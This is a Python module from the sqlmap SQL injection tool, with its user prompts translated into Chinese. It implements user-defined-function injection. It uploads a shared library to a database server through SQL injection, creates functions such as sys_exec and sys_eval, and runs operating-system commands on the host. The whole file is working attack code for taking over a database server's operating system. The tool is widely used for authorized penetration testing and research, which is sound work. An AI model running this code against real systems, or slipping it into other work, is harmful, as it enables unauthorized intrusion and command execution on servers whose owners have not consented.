#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import dataToStdout
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.exception import SqlmapUserQuitException
from lib.core.unescaper import unescaper
from lib.request import inject

class UDF(object):
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf = set()
        self.udfs = {}
        self.udfToCreate = set()

    def _askOverwriteUdf(self, udf):
        message = "UDF '%s' 已經存在,你想要覆蓋它嗎？[y/N] " % udf
        #message += "want to overwrite it? [y/N] "

        return readInput(message, default='N', boolean=True)

    def _checkExistUdf(self, udf):
        logger.info("檢查 UDF '%s' 是否已經存在" % udf)

        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))
        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)

    def udfCheckAndOverwrite(self, udf):
        exists = self._checkExistUdf(udf)
        overwrite = True

        if exists:
            overwrite = self._askOverwriteUdf(udf)

        if overwrite:
            self.udfToCreate.add(udf)

    def udfCreateSupportTbl(self, dataType):
        debugMsg = "正在創建支持用戶定義函數的表"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)

    def udfForgeCmd(self, cmd):
        if not cmd.startswith("'"):
            cmd = "'%s" % cmd

        if not cmd.endswith("'"):
            cmd = "%s'" % cmd

        return cmd

    def udfExecCmd(self, cmd, silent=False, udfName=None):
        if udfName is None:
            udfName = "sys_exec"

        cmd = unescaper.escape(self.udfForgeCmd(cmd))

        return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)

    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        if udfName is None:
            udfName = "sys_eval"

        if conf.direct:
            output = self.udfExecCmd(cmd, udfName=udfName)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    new_output += line.replace("\r", "\n")

                output = new_output
        else:
            cmd = unescaper.escape(self.udfForgeCmd(cmd))

            inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
            output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        return output

    def udfCheckNeeded(self):
        if (not any((conf.fileRead, conf.commonFiles)) or (any((conf.fileRead, conf.commonFiles)) and not Backend.isDbms(DBMS.PGSQL))) and "sys_fileread" in self.sysUdfs:
            self.sysUdfs.pop("sys_fileread")

        if not conf.osPwn:
            self.sysUdfs.pop("sys_bineval")

        if not conf.osCmd and not conf.osShell and not conf.regRead:
            self.sysUdfs.pop("sys_eval")

            if not conf.osPwn and not conf.regAdd and not conf.regDel:
                self.sysUdfs.pop("sys_exec")

    def udfSetRemotePath(self):
        errMsg = "在插件中必須定義 udfSetRemotePath() 方法"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfSetLocalPaths(self):
        errMsg = "在插件中必須定義 udfSetLocalPaths() 方法"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf, inpRet):
        errMsg = "在插件中必須定義 udfCreateFromSharedLib() 方法"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfInjectCore(self, udfDict):
        written = False

        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            checkFile(self.udfLocalFile)
            written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", forceCheck=True)

            if written is not True:
                errMsg = "上傳共享庫時出現問題,似乎二進制文件未寫入數據庫底層文件系統"
                #errMsg += "it looks like the binary file has not been written "
                #errMsg += "on the database underlying file system"
                logger.error(errMsg)

                message = "您是否仍要繼續？請注意,操作系統接管將失敗 [y/N] "
                #message += "operating system takeover will fail [y/N] "

                if readInput(message, default='N', boolean=True):
                    written = True
                else:
                    return False
        else:
            return True

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if Backend.isDbms(DBMS.MYSQL):
            supportTblType = "longtext"
        elif Backend.isDbms(DBMS.PGSQL):
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)

        return written

    def udfInjectSys(self):
        self.udfSetLocalPaths()
        self.udfCheckNeeded()
        return self.udfInjectCore(self.sysUdfs)

    def udfInjectCustom(self):
        if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):
            errMsg = "UDF 注入功能僅適用於 MySQL 和 PostgreSQL"
            logger.error(errMsg)
            return

        if not isStackingAvailable() and not conf.direct:
            errMsg = "UDF 注入功能需要堆疊查詢 SQL 注入"
            logger.error(errMsg)
            return

        self.checkDbmsOs()

        if not self.isDba():
            warnMsg = "由於當前會話用戶不是數據庫管理員,所以請求的功能可能無法正常工作"
            #warnMsg += "the current session user is not a database administrator"
            logger.warning(warnMsg)

        if not conf.shLib:
            msg = "共享庫的本地路徑是什麼？"

            while True:
                self.udfLocalFile = readInput(msg, default=None, checkBatch=False)

                if self.udfLocalFile:
                    break
                else:
                    logger.warning("您需要指定共享庫的本地路徑")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "指定的共享庫文件不存在"
            raise SqlmapFilePathException(errMsg)

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "共享庫文件必須以'.dll'或'.so'結尾"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".so") and Backend.isOs(OS.WINDOWS):
            errMsg = "您提供的共享對象作為共享庫,但數據庫底層操作系統是 Windows"
            #errMsg += "the database underlying operating system is Windows"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".dll") and Backend.isOs(OS.LINUX):
            errMsg = "您提供的動態鏈接庫作為共享庫,但數據庫底層操作系統是 Linux"
            #errMsg += "but the database underlying operating system is Linux"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        self.udfSharedLibName = os.path.basename(self.udfLocalFile).split(".")[0]
        self.udfSharedLibExt = os.path.basename(self.udfLocalFile).split(".")[1]

        msg = "您想從共享庫中創建多少個用戶定義函數？"
        #msg += "from the shared library? "

        while True:
            udfCount = readInput(msg, default='1')

            if udfCount.isdigit():
                udfCount = int(udfCount)

                if udfCount <= 0:
                    logger.info("沒有能注入的內容")
                    return
                else:
                    break
            else:
                logger.warning("無效值,僅允許數字")

        for x in xrange(0, udfCount):
            while True:
                msg = "第%d 個用戶定義函數的名稱是什麼？" % (x + 1)
                udfName = readInput(msg, default=None, checkBatch=False)

                if udfName:
                    self.udfs[udfName] = {}
                    break
                else:
                    logger.warning("您需要指定 UDF 的名稱")

            if Backend.isDbms(DBMS.MYSQL):
                defaultType = "string"
            elif Backend.isDbms(DBMS.PGSQL):
                defaultType = "text"

            self.udfs[udfName]["input"] = []

            msg = "UDF '%s'接受多少個輸入參數？(默認值:1)" % udfName
            #msg += "'%s'? (default: 1) " % udfName

            while True:
                parCount = readInput(msg, default='1')

                if parCount.isdigit() and int(parCount) >= 0:
                    parCount = int(parCount)
                    break

                else:
                    logger.warning("無效值,僅允許大於等於 0 的數字")

            for y in xrange(0, parCount):
                msg = "輸入參數%d 的數據類型是什麼？(默認值:%s)" % ((y + 1), defaultType)
                #msg += "number %d? (default: %s) " % ((y + 1), defaultType)

                while True:
                    parType = readInput(msg, default=defaultType).strip()

                    if parType.isdigit():
                        logger.warning("您需要指定參數的數據類型")

                    else:
                        self.udfs[udfName]["input"].append(parType)
                        break

            msg = "返回值的數據類型是什麼？(默認值:%s)" % defaultType
            #msg += "value? (default: %s) " % defaultType

            while True:
                retType = readInput(msg, default=defaultType)

                if hasattr(retType, "isdigit") and retType.isdigit():
                    logger.warning("您需要指定返回值的數據類型")
                else:
                    self.udfs[udfName]["return"] = retType
                    break

        success = self.udfInjectCore(self.udfs)

        if success is False:
            self.cleanup(udfDict=self.udfs)
            return False

        msg = "您是否要立即調用您注入的用戶定義函數？[Y/n/q] "
        #msg += "functions now? [Y/n/q] "
        choice = readInput(msg, default='Y').upper()

        if choice == 'N':
            self.cleanup(udfDict=self.udfs)
            return
        elif choice == 'Q':
            self.cleanup(udfDict=self.udfs)
            raise SqlmapUserQuitException

        while True:
            udfList = []
            msg = "你想調用哪個 UDF 函數？"

            for udf in self.udfs.keys():
                udfList.append(udf)
                msg += "\n[%d] %s" % (len(udfList), udf)

            msg += "\n[q] 退出"

            while True:
                choice = readInput(msg, default=None, checkBatch=False).upper()

                if choice == 'Q':
                    break
                elif isDigit(choice) and int(choice) > 0 and int(choice) <= len(udfList):
                    choice = int(choice)
                    break
                else:
                    warnMsg = "無效的值,只允許輸入大於等於 1 且小於等於%d 的數字" % len(udfList)
                    #warnMsg += "<= %d are allowed" % len(udfList)
                    logger.warning(warnMsg)

            if not isinstance(choice, int):
                break

            cmd = ""
            count = 1
            udfToCall = udfList[choice - 1]

            for inp in self.udfs[udfToCall]["input"]:
                msg = "參數%d 的值是多少 (數據類型:%s)？" % (count, inp)
                #msg += "%d (data-type: %s)? " % (count, inp)

                while True:
                    parValue = readInput(msg, default=None, checkBatch=False)

                    if parValue:
                        if "int" not in inp and "bool" not in inp:
                            parValue = "'%s'" % parValue

                        cmd += "%s," % parValue

                        break
                    else:
                        logger.warning("您需要指定參數的值")

                count += 1

            cmd = cmd[:-1]
            msg = "你想要獲取 UDF 的返回值嗎？[Y/n] "
            #msg += "UDF? [Y/n] "

            if readInput(msg, default='Y', boolean=True):
                output = self.udfEvalCmd(cmd, udfName=udfToCall)

                if output:
                    conf.dumper.string("返回值", output)
                else:
                    dataToStdout("無返回值\n")
            else:
                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)

            msg = "你想要調用這個注入的 UDF 還是另一個 UDF？[Y/n] "

            if not readInput(msg, default='Y', boolean=True):
                break

        self.cleanup(udfDict=self.udfs)
